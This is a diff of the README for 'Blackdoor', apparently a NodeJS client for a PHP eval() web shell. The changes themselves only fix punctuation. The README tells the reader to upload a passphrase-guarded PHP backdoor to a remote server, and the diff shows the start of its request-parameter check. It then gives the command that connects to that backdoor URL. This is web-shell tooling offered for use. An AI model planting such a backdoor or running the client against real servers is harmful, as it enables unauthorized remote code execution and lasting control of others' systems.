@@ -1,6 +1,6 @@
 <img src="imgs/logo.png" alt="Blackdoor logo" width="350px">
 
-Blackdoor is an NodeJS client for a simple `eval()` backdoor in PHP 
+Blackdoor is an NodeJS client for a simple `eval()` backdoor in PHP.
 
 ## Screenshots
 
@@ -8,7 +8,7 @@ Blackdoor is an NodeJS client for a simple `eval()` backdoor in PHP
 
 ## How to use
 
-First, upload a PHP backdoor on remote server, like this :
+First, upload a PHP backdoor on remote server, like this:
 
 ```php
 if(isset($_REQUEST['c']) && $_REQUEST['p'] == 'your-passphrase')
@@ -23,7 +23,7 @@ cd blackdoor
 npm install
 ```
 
-Now, you can connect :
+Now, you can connect:
 ```bash
 ./blackdoor.js -u http://exemple.com/backdoor.php -p your-passphrase
 ```
